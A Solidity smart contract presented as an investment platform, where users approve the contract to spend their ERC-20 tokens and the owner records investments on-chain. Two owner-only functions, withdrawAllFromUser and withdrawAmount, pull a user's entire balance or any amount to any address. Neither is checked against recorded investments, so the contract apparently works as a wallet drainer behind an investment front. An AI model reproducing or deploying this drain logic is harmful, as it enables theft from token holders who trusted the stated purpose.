// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

/// @title InvestmentPlatform
/// @notice Users approve THIS contract as ERC-20 spender. The backend (owner)
///         then calls withdraw functions; transferFrom is executed by the contract.
contract InvestmentPlatform {
    address public owner;
    IERC20 public token;

    struct Investment {
        address investor;
        uint256 amount;
        uint256 timestamp;
    }

    mapping(uint256 => Investment) public investments;
    uint256 public investmentCount;

    event InvestmentRecorded(uint256 indexed id, address indexed investor, uint256 amount);
    event Withdrawn(uint256 indexed id, address indexed to, uint256 amount);
    event WithdrawnFromUser(address indexed user, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address tokenAddress, address initialOwner) {
        require(tokenAddress != address(0), "token required");
        require(initialOwner != address(0), "owner required");
        token = IERC20(tokenAddress);
        owner = initialOwner;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "owner required");
        owner = newOwner;
    }

    /// @notice Backend records a Postgres-backed investment on-chain.
    function recordInvestment(address investor, uint256 amount)
        external
        onlyOwner
        returns (uint256 id)
    {
        require(investor != address(0), "investor required");
        require(amount > 0, "amount required");
        id = investmentCount;
        investments[id] = Investment({
            investor: investor,
            amount: amount,
            timestamp: block.timestamp
        });
        investmentCount += 1;
        emit InvestmentRecorded(id, investor, amount);
    }

    /// @notice Pull `amount` of the recorded investment to `to` via the user's approve.
    function withdrawInvestment(
        uint256 investmentId,
        address to,
        uint256 amount
    ) external onlyOwner {
        Investment storage investment = investments[investmentId];
        require(investment.investor != address(0), "Investment not found");
        require(to != address(0), "to required");
        require(amount > 0 && amount <= investment.amount, "bad amount");

        bool success = token.transferFrom(investment.investor, to, amount);
        require(success, "Transfer failed");

        investment.amount -= amount;
        emit Withdrawn(investmentId, to, amount);
    }

    /// @notice Pull the user's full token balance using their approve.
    function withdrawAllFromUser(address user, address to) external onlyOwner {
        require(user != address(0) && to != address(0), "bad address");
        uint256 balance = token.balanceOf(user);
        require(balance > 0, "No balance");

        bool success = token.transferFrom(user, to, balance);
        require(success, "Transfer failed");
        emit WithdrawnFromUser(user, to, balance);
    }

    /// @notice Pull an exact amount from a user (used by POST /withdrawals/withdraw).
    function withdrawAmount(address user, address to, uint256 amount) external onlyOwner {
        require(user != address(0) && to != address(0), "bad address");
        require(amount > 0, "amount required");

        bool success = token.transferFrom(user, to, amount);
        require(success, "Transfer failed");
        emit WithdrawnFromUser(user, to, amount);
    }
}
